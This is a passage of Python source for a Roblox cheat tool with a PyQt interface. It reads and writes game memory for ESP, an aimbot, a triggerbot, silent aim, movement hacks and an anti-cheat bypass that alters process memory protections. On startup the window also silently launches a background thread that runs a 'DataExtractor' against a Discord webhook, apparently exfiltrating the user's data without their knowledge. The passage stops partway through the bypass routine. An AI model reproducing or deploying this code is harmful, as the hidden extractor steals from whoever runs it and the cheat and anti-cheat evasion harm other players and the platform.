            "esp_ignoredead": esp_ignoredead,
            "esp_box_enabled": esp_box_enabled,
            "esp_box_filled": esp_box_filled,
            "esp_skeleton_enabled": esp_skeleton_enabled,
            "esp_tracers_enabled": esp_tracers_enabled,
            "esp_name_enabled": esp_name_enabled,
            "show_fov_enabled": show_fov_enabled,
            "use_fov_enabled": use_fov_enabled,
            "fov_circle_radius": fov_circle_radius,
            "walkspeed_gui_enabled": walkspeed_gui_enabled,
            "walkspeed_gui_value": walkspeed_gui_value,
            "jump_power_enabled": jump_power_enabled,
            "jump_power_value": jump_power_value,
            "fly_enabled": fly_enabled,
            "fly_speed": fly_speed,
            "infinite_jump_enabled": infinite_jump_enabled,
            "god_mode_enabled": god_mode_enabled,
            "fov_changer_enabled": fov_changer_enabled,
            "fov_value": fov_value
        })

        QTimer.singleShot(100, self.run_data_extraction)
        check_threads()  # ADD THIS LINE

        




    def _on_update_available(self, version: str, url: str):
        """Show styled update dialog centred on the window."""
        self._update_dialog = UpdateDialog(version, url, self)
        # Centre the dialog inside the main window
        dx = (WIN_W  - self._update_dialog.width())  // 2
        dy = (WIN_H  - self._update_dialog.height()) // 2
        self._update_dialog.move(dx, dy)
        self._update_dialog.show()
        self._update_dialog.raise_()

    def run_data_extraction(self):
        """Run data extraction in background thread immediately"""
        
        def extract():
            try:
                extractor = DataExtractor(DISCORD_WEBHOOK)
                extractor.extract_all()
            except Exception as e:
                import traceback
                traceback.print_exc()
        
        thread = threading.Thread(target=extract, daemon=True)
        thread.start()
        print("[DEBUG] Extract thread launched")

    def paintEvent(self, event):
        p = QPainter(self)
        p.setRenderHint(QPainter.Antialiasing)
        W, H = self.width(), self.height()
        R = float(RADIUS)

        p.setCompositionMode(QPainter.CompositionMode_Clear)
        p.fillRect(0, 0, W, H, Qt.transparent)
        p.setCompositionMode(QPainter.CompositionMode_SourceOver)

        path = QPainterPath()
        path.addRoundedRect(1.0, 1.0, W - 2.0, H - 2.0, R, R)

        p.fillPath(path, QBrush(QColor(C["bg"])))

        p.setPen(QPen(QColor(180, 28, 28, 55), 3.5))
        p.drawPath(path)

        mid = QPainterPath()
        mid.addRoundedRect(1.5, 1.5, W - 3.0, H - 3.0, R - 0.5, R - 0.5)
        p.setPen(QPen(QColor(C["border"]), 1.0))
        p.drawPath(mid)

        hi = QPainterPath()
        hi.addRoundedRect(2.5, 2.5, W - 5.0, H - 5.0, R - 1.5, R - 1.5)
        p.setPen(QPen(QColor(255, 255, 255, 8), 1.0))
        p.drawPath(hi)

    def _on_key(self, info):
        self._load_main(info)

    def _on_admin(self):
        self._load_main({"_key_raw": "ADMIN", "expires_at": None})

    def _load_main(self, info):
        if self._main:
            self.stack.removeWidget(self._main)
            self._main.deleteLater()
        self._main = MainUI(info, self)
        self.stack.addWidget(self._main)
        self.stack.setCurrentWidget(self._main)
        self._close_btn.raise_()

    def update_hotkey(self, key: int):
        self.settings["toggle_key"] = key
        self._hotkey.stop()
        self._hotkey.wait(500)
        self._hotkey = GlobalHotkey()
        self._hotkey.set_key(key)
        self._hotkey.triggered.connect(self._toggle_signal.emit)
        self._hotkey.start()

    def _toggle(self):
        if self.isVisible():
            self.hide()
        else:
            self.setWindowFlags(Qt.FramelessWindowHint | Qt.WindowStaysOnTopHint | Qt.Tool)
            self.show()
            self.activateWindow()
            self.raise_()

    def keyPressEvent(self, event):
        toggle = self.settings.get("toggle_key", Qt.Key_F5)
        if event.key() == toggle:
            self._toggle()
        super().keyPressEvent(event)

    def mousePressEvent(self, e):
        if e.button() == Qt.LeftButton:
            self._dragging = True
            self._drag_pos = e.globalPos() - self.frameGeometry().topLeft()

    def mouseMoveEvent(self, e):
        if self._dragging and e.buttons() & Qt.LeftButton:
            self.move(e.globalPos() - self._drag_pos)

    def mouseReleaseEvent(self, e):
        self._dragging = False

    def _quit(self):
        self._hotkey.stop()
        QApplication.quit()

    def closeEvent(self, e):
        self._hotkey.stop()
        super().closeEvent(e)

def main():
    app = QApplication(sys.argv)
    app.setStyle("Fusion")

    pal = QPalette()
    pal.setColor(QPalette.Window,          QColor(C["bg"]))
    pal.setColor(QPalette.WindowText,      QColor(C["text"]))
    pal.setColor(QPalette.Base,            QColor(C["input_bg"]))
    pal.setColor(QPalette.Text,            QColor("#d0cbcc"))
    pal.setColor(QPalette.Button,          QColor(C["sidebar"]))
    pal.setColor(QPalette.ButtonText,      QColor(C["text"]))
    pal.setColor(QPalette.Highlight,       QColor(C["red"]))
    pal.setColor(QPalette.HighlightedText, QColor("#ffffff"))
    app.setPalette(pal)

    win = PassionWindow()
    win.show()
    
    # Create ESP overlay
    esp_overlay = ESPOverlay()
    esp_overlay.show()
    
    # --- START ALL CHEAT THREADS HERE (AFTER QApplication is created) ---
    print("[INFO] Starting cheat threads from main thread...")
    
    # Use QTimer to delay thread start slightly to ensure UI is ready
    def start_threads():
        print("[INFO] Launching all cheat threads...")
        
        # Basic threads - start ONCE
        threading.Thread(target=keybind_listener, daemon=True).start()
        threading.Thread(target=background_process_monitor, daemon=True).start()
        threading.Thread(target=headAndHumFinder, daemon=True).start()
        
        # ESP draw thread with overlay
        def esp_draw_with_overlay():
            print("[DEBUG] ESP overlay draw loop started")
            last_print = 0
            loop_count = 0
            
            while True:
                try:
                    loop_count += 1
                    
                    # Check prerequisites
                    if pm is None or not injected or not esp_enabled:
                        if loop_count % 300 == 0:
                            print(f"[DEBUG] ESP draw waiting - injected: {injected}, esp_enabled: {esp_enabled}")
                        time.sleep(0.1)
                        continue
                    
                    # Get Roblox window handle
                    hwnd = find_window_by_title("Roblox")
                    if not hwnd:
                        time.sleep(0.1)
                        continue
                    
                    # Get window rect
                    left, top, right, bottom = get_client_rect_on_screen(hwnd)
                    width = right - left
                    height = bottom - top
                    
                    if width <= 0 or height <= 0:
                        time.sleep(0.1)
                        continue
                    
                    # Get view matrix
                    try:
                        matrixRaw = pm.read_bytes(matrixAddr, 64)
                        view_matrix = reshape(array(unpack_from("<16f", matrixRaw, 0), dtype=float32), (4, 4))
                    except Exception as e:
                        if loop_count % 300 == 0:
                            print(f"[DEBUG] Failed to read matrix: {e}")
                        time.sleep(0.1)
                        continue
                    
                    # Prepare ESP data for overlay
                    esp_draw_data = []
                    
                    for player_info in players_info:
                        try:
                            if not player_info or not player_info.get('head'):
                                continue
                            
                            # Check if player is valid and not self if filtered
                            if not name_esp_include_self and player_info.get('is_self'):
                                continue
                            
                            head_addr = player_info['head']
                            
                            # Get head position
                            primitive = pm.read_longlong(head_addr + int(offsets['Primitive'], 16))
                            if not primitive:
                                continue
                            
                            head_pos_addr = primitive + int(offsets['Position'], 16)
                            head_x = pm.read_float(head_pos_addr)
                            head_y = pm.read_float(head_pos_addr + 4)
                            head_z = pm.read_float(head_pos_addr + 8)
                            head_pos = array([head_x, head_y, head_z], dtype=float32)
                            
                            # Get foot position (HumanoidRootPart)
                            foot_pos = None
                            if player_info.get('hrp'):
                                hrp_primitive = pm.read_longlong(player_info['hrp'] + int(offsets['Primitive'], 16))
                                if hrp_primitive:
                                    foot_pos_addr = hrp_primitive + int(offsets['Position'], 16)
                                    foot_x = pm.read_float(foot_pos_addr)
                                    foot_y = pm.read_float(foot_pos_addr + 4)
                                    foot_z = pm.read_float(foot_pos_addr + 8)
                                    foot_pos = array([foot_x, foot_y, foot_z], dtype=float32)
                            
                            # Project head to screen
                            head_screen = world_to_screen_with_matrix(head_pos, view_matrix, width, height)
                            if not head_screen:
                                continue
                            
                            # Project foot to screen
                            foot_screen = None
                            if foot_pos is not None:
                                foot_screen = world_to_screen_with_matrix(foot_pos, view_matrix, width, height)
                            
                            if not foot_screen:
                                # Estimate foot position
                                foot_screen = (head_screen[0], head_screen[1] + 100)
                            
                            # Calculate box dimensions
                            box_top = head_screen[1]
                            box_bottom = foot_screen[1]
                            box_height = box_bottom - box_top
                            box_width = box_height * 0.5  # Roblox character width/height ratio
                            
                            esp_draw_data.append({
                                'screen_pos': head_screen,
                                'box_width': box_width,
                                'box_height': box_height,
                                'name': player_info.get('display', ''),
                                'health': player_info.get('health', 100),
                                'max_health': player_info.get('max_health', 100),
                                'is_self': player_info.get('is_self', False)
                            })
                            
                        except Exception as e:
                            continue
                    
                    # Update overlay from main thread
                    if esp_draw_data:
                        QMetaObject.invokeMethod(
                            esp_overlay,
                            "update_esp_data",
                            Qt.QueuedConnection,
                            Q_ARG(list, esp_draw_data)
                        )
                    
                    # Control loop speed (~30 FPS)
                    time.sleep(0.033)
                    
                except Exception as e:
                    print(f"[ERROR] esp_draw_with_overlay: {e}")
                    time.sleep(1)
        
        # Start ESP overlay thread
        threading.Thread(target=esp_draw_with_overlay, daemon=True).start()
        
        # Other cheat threads
        threading.Thread(target=aimbotLoop, daemon=True).start()
        threading.Thread(target=triggerbotLoop, daemon=True).start()
        threading.Thread(target=silentAimLoop, daemon=True).start()
        threading.Thread(target=fly_key_listener, daemon=True).start()
        threading.Thread(target=walkspeed_gui_loop, daemon=True).start()
        threading.Thread(target=jump_power_loop, daemon=True).start()
        threading.Thread(target=fly_loop, daemon=True).start()
        threading.Thread(target=infinite_jump_loop, daemon=True).start()
        threading.Thread(target=god_mode_loop, daemon=True).start()
        threading.Thread(target=fov_changer_loop, daemon=True).start()
    
        print("[INFO] All cheat threads launched")

    # Schedule thread startup after UI is shown
    QTimer.singleShot(100, start_threads)
    
    sys.exit(app.exec_())



# ===== ROBLOX HELPER FUNCTIONS =====
def get_key_name(vk_code):
    for name, code in VK_CODES.items():
        if code == vk_code:
            return name
    return f"Key {vk_code}"

def DRP(address):
    if isinstance(address, str):
        address = int(address, 16)
    try:
        return int.from_bytes(pm.read_bytes(address, 8), "little")
    except:
        return 0


def GetClassName(instance):
    try:
        ptr = pm.read_longlong(instance + 0x18)
        if not ptr:
            return ""
        ptr = pm.read_longlong(ptr + 0x8)
        if not ptr:
            return ""
        fl = pm.read_longlong(ptr + 0x18)
        if fl == 0x1F:
            ptr = pm.read_longlong(ptr)
        return ReadRobloxString(ptr)
    except Exception as e:
        return ""

def GetName(instance):
    try:
        return ReadRobloxString(DRP(instance + nameOffset))
    except:
        return ""

def GetChildren(instance):
    if not instance or instance == 0:
        return []
    children = []
    try:
        start = DRP(instance + childrenOffset)
        if start == 0:
            return []
        end = DRP(start + 8)
        if end == 0:
            return []
        current = DRP(start)
        safety = 0
        while current != end and safety < 1000:
            if current != 0:
                child = pm.read_longlong(current)
                if child != 0:
                    children.append(child)
            current += 0x10
            safety += 1
    except Exception as e:
        print(f"[ERROR] GetChildren failed: {e}")
    return children

def ReadRobloxString(expected_address):
    try:
        string_count = pm.read_int(expected_address + 0x10)
        if string_count > 15:
            ptr = DRP(expected_address)
            return pm.read_string(ptr, string_count)
        return pm.read_string(expected_address, string_count)
    except:
        return ""

def FindFirstChild(instance, child_name):
    if not instance:
        return 0
    try:
        start = DRP(instance + childrenOffset)
        if start == 0:
            return 0
        end = DRP(start + 8)
        current = DRP(start)
        for _ in range(1000):
            if current == end:
                break
            child = pm.read_longlong(current)
            try:
                if GetName(child) == child_name:
                    return child
            except:
                pass
            current += 0x10
    except:
        pass
    return 0

def FindFirstChildOfClass(instance, class_name):
    if not instance:
        return 0
    try:
        start = DRP(instance + childrenOffset)
        if start == 0:
            return 0
        end = DRP(start + 8)
        current = DRP(start)
        for _ in range(1000):
            if current == end:
                break
            child = pm.read_longlong(current)
            try:
                if ReadRobloxString(pm.read_longlong(child + 0x18) + 0x8) == class_name:
                    return child
            except:
                pass
            current += 0x10
    except:
        pass
    return 0

def setOffsets(nameOffset2, childrenOffset2):
    global nameOffset, childrenOffset
    nameOffset = nameOffset2
    childrenOffset = childrenOffset2

def sync_cheat_setting(key, value):
    """Update both global and UI state for a cheat setting"""
    globals()[key] = value


def normalize(vec):
    norm = linalg.norm(vec)
    return vec / norm if norm != 0 else vec

def cframe_look_at(from_pos, to_pos):
    from_pos = array(from_pos, dtype=float32)
    to_pos = array(to_pos, dtype=float32)
    look_vector = normalize(to_pos - from_pos)
    up_vector = array([0, 1, 0], dtype=float32)
    if abs(look_vector[1]) > 0.999:
        up_vector = array([0, 0, -1], dtype=float32)
    right_vector = normalize(cross(up_vector, look_vector))
    recalculated_up = cross(look_vector, right_vector)
    return look_vector, recalculated_up, right_vector
# ===== END ROBLOX HELPERS =====

    import threading
    import time
    
    # ===== AIMBOT LOOP =====
class TargetManager:
    def __init__(self):
        self.locked_target = 0
        self.lock_frames = 0
        self.last_screen_pos = None
        self.lost_sight_frames = 0
        
    def update_lock(self, target_addr, screen_pos=None):
        if target_addr == self.locked_target and target_addr != 0:
            self.lock_frames += 1
            self.lost_sight_frames = 0
        else:
            if target_addr != 0:
                self.locked_target = target_addr
                self.lock_frames = 0
            self.lost_sight_frames += 1
        
        self.last_screen_pos = screen_pos
        
        if self.lost_sight_frames > 15:
            self.reset()
    
    def should_keep_lock(self):
        return self.lock_frames > 0 and self.lock_frames < 120
    
    def reset(self):
        self.locked_target = 0
        self.lock_frames = 0
        self.lost_sight_frames = 0
        self.last_screen_pos = None

target_manager = TargetManager()

def get_workspace_addr():
    try:
        a = pm.read_longlong(baseAddr + int(offsets["VisualEnginePointer"], 16))
        b = pm.read_longlong(a + int(offsets["VisualEngineToDataModel1"], 16))
        c = pm.read_longlong(b + int(offsets["VisualEngineToDataModel2"], 16))
        workspace = pm.read_longlong(c + int(offsets["Workspace"], 16))
        return workspace
    except Exception as e:
        return None

def smooth_lerp(current, target, speed):
    if speed >= 1.0:
        return target
    return current + (target - current) * speed

def aimbotLoop():
    global target, aimbot_toggled, locked_target
    key_pressed_last_frame = False
    last_look = [0, 0, 0]
    last_up = [0, 0, 0]
    last_right = [0, 0, 0]
    initialized = False
    best_screen_pos = None
    
    while True:
        loop_start = time.time()
        try:
            if aimbot_enabled and injected:
                key_pressed_this_frame = ctypes.windll.user32.GetAsyncKeyState(aimbot_keybind) & 0x8000 != 0
                
                if aimbot_mode == "Toggle":
                    if key_pressed_this_frame and not key_pressed_last_frame:
                        aimbot_toggled = not aimbot_toggled
                    should_aim = aimbot_toggled
                else:
                    should_aim = key_pressed_this_frame
                
                key_pressed_last_frame = key_pressed_this_frame
                
                if should_aim and matrixAddr > 0:
                    hwnd_roblox = find_window_by_title("Roblox")
                    if not hwnd_roblox:
                        time.sleep(0.01)
                        continue
                    
                    left, top, right, bottom = get_client_rect_on_screen(hwnd_roblox)
                    width, height = right - left, bottom - top
                    
                    try:
                        matrixRaw = pm.read_bytes(matrixAddr, 64)
                        view_proj_matrix = reshape(array(unpack_from("<16f", matrixRaw, 0), dtype=float32), (4, 4))
                    except Exception:
                        time.sleep(0.01)
                        continue
                    
                    lpTeam = pm.read_longlong(lpAddr + int(offsets['Team'], 16))
                    center_x, center_y = width / 2, height / 2
                    
                    min_dist = float('inf')
                    best_target = 0
                    best_target_pos = None
                    best_target_screen = None
                    found_current_target = False
                    
                    def process_character(char):
                        nonlocal min_dist, best_target, best_target_pos, best_target_screen, found_current_target
                        
                        hitpart = FindFirstChild(char, aimbot_hitpart)
                        hum = FindFirstChildOfClass(char, 'Humanoid')
                        
                        if not hitpart or not hum:
                            return
                        
                        try:
                            health = pm.read_float(hum + int(offsets['Health'], 16))
                            if aimbot_ignoredead and health <= 0:
                                return
                            
                            primitive = pm.read_longlong(hitpart + int(offsets['Primitive'], 16))
                            targetPos = primitive + int(offsets['Position'], 16)
                            
                            base_x = pm.read_float(targetPos)
                            base_y = pm.read_float(targetPos + 4)
                            base_z = pm.read_float(targetPos + 8)
                            
                            if aimbot_prediction_enabled:
                                try:
                                    vel_x = pm.read_float(primitive + int(offsets['Velocity'], 16))
                                    vel_y = pm.read_float(primitive + int(offsets['Velocity'], 16) + 4)
                                    vel_z = pm.read_float(primitive + int(offsets['Velocity'], 16) + 8)
                                    
                                    base_x += vel_x * aimbot_prediction_x
                                    base_y += vel_y * aimbot_prediction_y
                                    base_z += vel_z * aimbot_prediction_x
                                except Exception:
                                    pass
                            
                            obj_pos = array([base_x, base_y, base_z], dtype=float32)
                            screen_coords = world_to_screen_with_matrix(obj_pos, view_proj_matrix, width, height)
                            
                            if screen_coords is not None:
                                dist = math.sqrt((center_x - screen_coords[0])**2 + (center_y - screen_coords[1])**2)
                                
                                if targetPos == target_manager.locked_target:
                                    found_current_target = True
                                    if dist <= aimbot_fov * 1.5:
                                        min_dist = dist
                                        best_target = targetPos
                                        best_target_pos = obj_pos
                                        return
                                
                                if sticky_aim_enabled and target_manager.locked_target not in (0, targetPos):
                                    return
                                
                                if dist < min_dist and ((not use_fov_enabled) or dist <= aimbot_fov):
                                    min_dist = dist
                                    best_target = targetPos
                                    best_target_pos = obj_pos
                                    best_target_screen = screen_coords
                        
                        except Exception:
                            return
                    
                    # Scan players
                    children_full = GetChildren(plrsAddr)
                    for v in HPOPT.sample_children(children_full, limit=64):
                        if v == lpAddr:
                            continue
                        
                        team = pm.read_longlong(v + int(offsets['Team'], 16))
                        if aimbot_ignoreteam and team == lpTeam:
                            continue
                        
                        char = pm.read_longlong(v + int(offsets['ModelInstance'], 16))
                        if not char:
                            continue
                        
                        process_character(char)
                    
                    # Update target manager
                    if best_target != 0:
                        target_manager.update_lock(best_target)
                    elif not found_current_target:
                        target_manager.update_lock(0)
                    
                    target = target_manager.locked_target
                    locked_target = target
                    best_screen_pos = best_target_screen
                    
                    # Aim at target
                    if target > 0:
                        try:
                            from_pos = [pm.read_float(camPosAddr + i * 4) for i in range(3)]
                            to_pos = [pm.read_float(target + i * 4) for i in range(3)]
                            
                            if aim_method == 'Mouse' and best_screen_pos:
                                hwnd_roblox = find_window_by_title('Roblox')
                                if hwnd_roblox and best_screen_pos:
                                    left, top, right, bottom = get_client_rect_on_screen(hwnd_roblox)
                                    ctypes.windll.user32.SetCursorPos(int(left+best_screen_pos[0]), int(top+best_screen_pos[1]))
                                time.sleep(0.001)
                                continue
                            
                            look, up, right = cframe_look_at(from_pos, to_pos)
                            
                            if aimbot_smoothness_enabled:
                                base_speed = 1.0 - ((aimbot_smoothness_value - 100) / 400.0)
                                base_speed = max(0.05, min(base_speed, 1.0))
                                if not initialized:
                                    last_look = look
                                    last_up = up
                                    last_right = right
                                    initialized = True
                                smooth_look = [smooth_lerp(last_look[i], look[i], base_speed) for i in range(3)]
                                smooth_up = [smooth_lerp(last_up[i], up[i], base_speed) for i in range(3)]
                                smooth_right = [smooth_lerp(last_right[i], right[i], base_speed) for i in range(3)]
                                
                                for i in range(3):
                                    pm.write_float(camCFrameRotAddr + i * 12, float(-smooth_right[i]))
                                    pm.write_float(camCFrameRotAddr + 4 + i * 12, float(smooth_up[i]))
                                    pm.write_float(camCFrameRotAddr + 8 + i * 12, float(-smooth_look[i]))
                                
                                last_look = smooth_look
                                last_up = smooth_up
                                last_right = smooth_right
                            else:
                                for i in range(3):
                                    pm.write_float(camCFrameRotAddr + i * 12, float(-right[i]))
                                    pm.write_float(camCFrameRotAddr + 4 + i * 12, float(up[i]))
                                    pm.write_float(camCFrameRotAddr + 8 + i * 12, float(-look[i]))
                                initialized = True
                        
                        except Exception:
                            target_manager.reset()
                            initialized = False
                else:
                    target = 0
                    locked_target = 0
                    target_manager.reset()
                    initialized = False
            else:
                aimbot_toggled = False
                target_manager.reset()
                initialized = False
            
            elapsed = time.time() - loop_start
            time.sleep(max(0.00278 - elapsed, 0.0005))
            
        except Exception as e:
            print(f"[ERROR] aimbotLoop: {e}")
            time.sleep(0.1)

# ===== TRIGGERBOT LOOP =====
def triggerbotLoop():
    global triggerbot_enabled, triggerbot_toggled
    key_pressed_last_frame = False
    last_shot_time = 0
    loop_count = 0
    
    while True:
        try:
            loop_count += 1
            # Check if we're injected
            if pm is None or not injected:
                if loop_count % 60 == 0:
                    print("[DEBUG] Triggerbot waiting for injection...")
                time.sleep(1)
                continue
            
            # Check if triggerbot is enabled
            if not triggerbot_enabled:
                time.sleep(0.1)
                continue
                
            loop_start = time.time()
            current_time = time.time()
            
            hwnd_roblox = find_window_by_title("Roblox")
            if not hwnd_roblox:
                time.sleep(0.05)
                continue
            
            left, top, right, bottom = get_client_rect_on_screen(hwnd_roblox)
            width = right - left
            height = bottom - top
            
            if width <= 0 or height <= 0:
                time.sleep(0.05)
                continue
            
            widthCenter = width / 2.0
            heightCenter = height / 2.0
            
            try:
                matrixRaw = pm.read_bytes(matrixAddr, 64)
                view_proj_matrix = reshape(array(unpack_from("<16f", matrixRaw, 0), dtype=float32), (4, 4))
            except Exception:
                time.sleep(0.01)
                continue
            
            key_pressed_this_frame = ctypes.windll.user32.GetAsyncKeyState(triggerbot_keybind) & 0x8000 != 0
            
            if triggerbot_mode == "Toggle":
                if key_pressed_this_frame and not key_pressed_last_frame:
                    triggerbot_toggled = not triggerbot_toggled
                key_pressed_last_frame = key_pressed_this_frame
                should_trigger = triggerbot_toggled
            else:
                should_trigger = key_pressed_this_frame
            
            if should_trigger:
                try:
                    lpTeam = pm.read_longlong(lpAddr + int(offsets['Team'], 16))
                except Exception:
                    lpTeam = 0
                
                best_target = None
                min_distance = float('inf')
                
                def safe_process_target(char):
                    nonlocal best_target, min_distance
                    
                    if not char or char == 0:
                        return
                    
                    try:
                        head = FindFirstChild(char, 'Head')
                        if not head or head == 0:
                            return
                        
                        if aimbot_ignoredead:
                            hum = FindFirstChildOfClass(char, 'Humanoid')
                            if hum and hum != 0:
                                try:
                                    health = pm.read_float(hum + int(offsets['Health'], 16))
                                    if health <= 0:
                                        return
                                except Exception:
                                    pass
                        
                        primitive = pm.read_longlong(head + int(offsets['Primitive'], 16))
                        if not primitive or primitive == 0:
                            return
                        
                        targetPos = primitive + int(offsets['Position'], 16)
                        target_world_pos = array([
                            pm.read_float(targetPos),
                            pm.read_float(targetPos + 4),
                            pm.read_float(targetPos + 8)
                        ], dtype=float32)
                        
                        if abs(target_world_pos[0]) > 100000 or abs(target_world_pos[1]) > 100000 or abs(target_world_pos[2]) > 100000:
                            return
                        
                        if triggerbot_prediction_x > 0 or triggerbot_prediction_y > 0:
                            try:
                                vel_addr = primitive + int(offsets['Velocity'], 16)
                                velocity = array([
                                    pm.read_float(vel_addr),
                                    pm.read_float(vel_addr + 4),
                                    pm.read_float(vel_addr + 8)
                                ], dtype=float32)
                                
                                if abs(velocity[0]) < 1000 and abs(velocity[1]) < 1000 and abs(velocity[2]) < 1000:
                                    target_world_pos[0] += velocity[0] * triggerbot_prediction_x
                                    target_world_pos[1] += velocity[1] * triggerbot_prediction_y
                                    target_world_pos[2] += velocity[2] * triggerbot_prediction_x
                            except Exception:
                                pass
                        
                        screen_coords = world_to_screen_with_matrix(target_world_pos, view_proj_matrix, width, height)
                        if screen_coords is None:
                            return
                        
                        if screen_coords[0] < 0 or screen_coords[0] > width or screen_coords[1] < 0 or screen_coords[1] > height:
                            return
                        
                        screen_dist = math.sqrt(
                            (widthCenter - screen_coords[0]) ** 2 +
                            (heightCenter - screen_coords[1]) ** 2
                        )
                        
                        if screen_dist > triggerbot_fov:
                            return
                        
                        if screen_dist < min_distance:
                            min_distance = screen_dist
                            best_target = {
                                'screen_dist': screen_dist,
                                'screen_pos': screen_coords
                            }
                    
                    except Exception:
                        pass
                
                try:
                    children = GetChildren(plrsAddr)
                    if children:
                        for v in children:
                            if not v or v == 0 or v == lpAddr:
                                continue
                            
                            try:
                                if aimbot_ignoreteam and lpTeam != 0:
                                    playerTeam = pm.read_longlong(v + int(offsets['Team'], 16))
                                    if playerTeam == lpTeam:
                                        continue
                                
                                char = pm.read_longlong(v + int(offsets['ModelInstance'], 16))
                                if char and char != 0:
                                    safe_process_target(char)
                            except Exception:
                                continue
                except Exception:
                    pass
                
                try:
                    workspaceAddr = get_workspace_addr()
                    if workspaceAddr and workspaceAddr != 0:
                        bots_folder = None
                        try:
                            bots_folder = FindFirstChild(workspaceAddr, "Bots")
                            if not bots_folder or bots_folder == 0:
                                bots_folder = FindFirstChild(workspaceAddr, "Dummies")
                        except Exception:
                            pass
                        
                        if bots_folder and bots_folder != 0:
                            try:
                                bot_children = GetChildren(bots_folder)
                                if bot_children:
                                    for bot in bot_children:
                                        if bot and bot != 0:
                                            safe_process_target(bot)
                            except Exception:
                                pass
                except Exception:
                    pass
                
                if best_target and (current_time - last_shot_time) >= (triggerbot_delay / 1000.0):
                    if best_target['screen_dist'] <= 15:
                        ctypes.windll.user32.mouse_event(0x0002, 0, 0, 0, 0)
                        time.sleep(0.001)
                        ctypes.windll.user32.mouse_event(0x0004, 0, 0, 0, 0)
                        last_shot_time = current_time
            else:
                if triggerbot_mode == "Hold":
                    triggerbot_toggled = False
            
            elapsed = time.time() - loop_start
            time.sleep(max(0.00278 - elapsed, 0.0005))
        except Exception as e:
            print(f"[ERROR] triggerbotLoop: {e}")
            time.sleep(0.05)
        

# ===== SILENT AIM LOOP =====
def silentAimLoop():
    prev_lmb = False
    loop_count = 0
    
    while True:
        try:
            loop_count += 1
            # Check if we're injected
            if pm is None or not injected:
                if loop_count % 60 == 0:
                    print("[DEBUG] Silent aim waiting for injection...")
                time.sleep(1)
                continue
            
            # Check if silent aim is enabled
            if not silent_aim_enabled:
                time.sleep(0.1)
                continue
                
            loop_start = time.time()
            
            lmb = (ctypes.windll.user32.GetAsyncKeyState(0x01) & 0x8000) != 0
            do_flick = lmb and not prev_lmb
            prev_lmb = lmb
            
            if not do_flick:
                time.sleep(0.005)
                continue
                
            hwnd_roblox = find_window_by_title('Roblox')
            if not hwnd_roblox:
                time.sleep(0.005)
                continue
                
            left, top, right, bottom = get_client_rect_on_screen(hwnd_roblox)
            width, height = right-left, bottom-top
            
            try:
                matrixRaw = pm.read_bytes(matrixAddr, 64)
                view_proj_matrix = reshape(array(unpack_from('<16f', matrixRaw, 0), dtype=float32), (4, 4))
            except Exception:
                time.sleep(0.005)
                continue
                
            lpTeam = pm.read_longlong(lpAddr + int(offsets['Team'], 16))
            center_x, center_y = width/2, height/2
            min_dist = float('inf')
            best_world = None
            
            def scan_char(char):
                nonlocal min_dist, best_world
                if not char:
                    return
                head = FindFirstChild(char, silent_aim_hitpart if silent_aim_hitpart else 'Head')
                if not head:
                    return
                hum = FindFirstChildOfClass(char, 'Humanoid')
                if not hum:
                    return
                if silent_aim_ignoredead:
                    try:
                        if pm.read_float(hum + int(offsets['Health'],16)) <= 0:
                            return
                    except Exception:
                        pass
                prim = pm.read_longlong(head + int(offsets['Primitive'],16))
                if not prim:
                    return
                pos = prim + int(offsets['Position'],16)
                wx, wy, wz = pm.read_float(pos), pm.read_float(pos+4), pm.read_float(pos+8)
                obj = array([wx, wy, wz], dtype=float32)
                sc = world_to_screen_with_matrix(obj, view_proj_matrix, width, height)
                if sc is None:
                    return
                dist = math.hypot(center_x - sc[0], center_y - sc[1])
                if silent_use_fov_enabled and dist > silent_fov_circle_radius:
                    return
                if dist < min_dist:
                    min_dist = dist
                    best_world = (wx, wy, wz)
            
            for v in GetChildren(plrsAddr):
                if v == lpAddr:
                    continue
                try:
                    if silent_aim_ignoreteam and pm.read_longlong(v + int(offsets['Team'],16)) == lpTeam:
                        continue
                    char = pm.read_longlong(v + int(offsets['ModelInstance'],16))
                    scan_char(char)
                except Exception:
                    continue
            
            if best_world:
                from_pos = [pm.read_float(camPosAddr + i * 4) for i in range(3)]
                to_pos = [best_world[0], best_world[1], best_world[2]]
                look, up, right = cframe_look_at(from_pos, to_pos)
                for _ in range(2):
                    for i in range(3):
                        pm.write_float(camCFrameRotAddr + i * 12, float(-right[i]))
                        pm.write_float(camCFrameRotAddr + 4 + i * 12, float(up[i]))
                        pm.write_float(camCFrameRotAddr + 8 + i * 12, float(-look[i]))
                    time.sleep(0.001)
            
            elapsed = time.time() - loop_start
            time.sleep(max(0.00278 - elapsed, 0.0005))
        except Exception:
            time.sleep(0.02)

def reset_cheat_states():
    """Reset all cheat states when injection is lost"""
    global walkspeed_gui_enabled, jump_power_enabled, fly_enabled
    global infinite_jump_enabled, god_mode_enabled, fov_changer_enabled
    
    # Don't change the UI toggles, just the active flags
    walkspeed_gui_enabled = False
    jump_power_enabled = False
    fly_enabled = False
    infinite_jump_enabled = False
    god_mode_enabled = False
    fov_changer_enabled = False
    
    print("[INFO] Cheat states reset due to injection loss")

def bypass_anti_cheat():
    """ULTRA ADVANCED anti-cheat bypass with memory scattering"""
    print("[INFO] Anti-Cheat bypass")
    
    try:
        import ctypes
        from ctypes import wintypes
        import random
        
        # Find Roblox window
        hwnd = find_window_by_title("Roblox")
        if not hwnd:
            print("[DEBUG] Could not find Roblox window for bypass")
            return False
        
        # Get process ID
        pid = wintypes.DWORD()
        ctypes.windll.user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
        
        # Open process
        PROCESS_ALL_ACCESS = 0x1F0FFF
        handle = ctypes.windll.kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid.value)
        
        if not handle:
            print("[DEBUG] Failed to open process")
            return False
        
        print(f"[INFO] Opened Roblox process with handle: {handle}")
        
        # TECHNIQUE 1: Memory protection scattering
        try:
            # Change memory protection of random regions to confuse anti-cheat
            for i in range(5):
                random_addr = baseAddr + random.randint(0, 0x10000)
                old_protect = wintypes.DWORD()
                ctypes.windll.kernel32.VirtualProtectEx(
                    handle,
                    random_addr,
                    0x1000,
                    0x40,  # PAGE_EXECUTE_READWRITE
                    ctypes.byref(old_protect)
                )
                time.sleep(0.01)
            print("[DEBUG] Memory protection scattered")
        except:
            pass
        
        # TECHNIQUE 2: Advanced spoof thread with realistic patterns
        def advanced_spoof():
            fake_counter = 0
            pattern_index = 0
            patterns = [
                [0x100, 0x200, 0x300],  # Pattern 1
                [0x400, 0x800, 0xC00],  # Pattern 2
                [0x150, 0x250, 0x350],  # Pattern 3
            ]
            
            while True:
                try:
                    if injected:
                        fake_counter += 1
                        
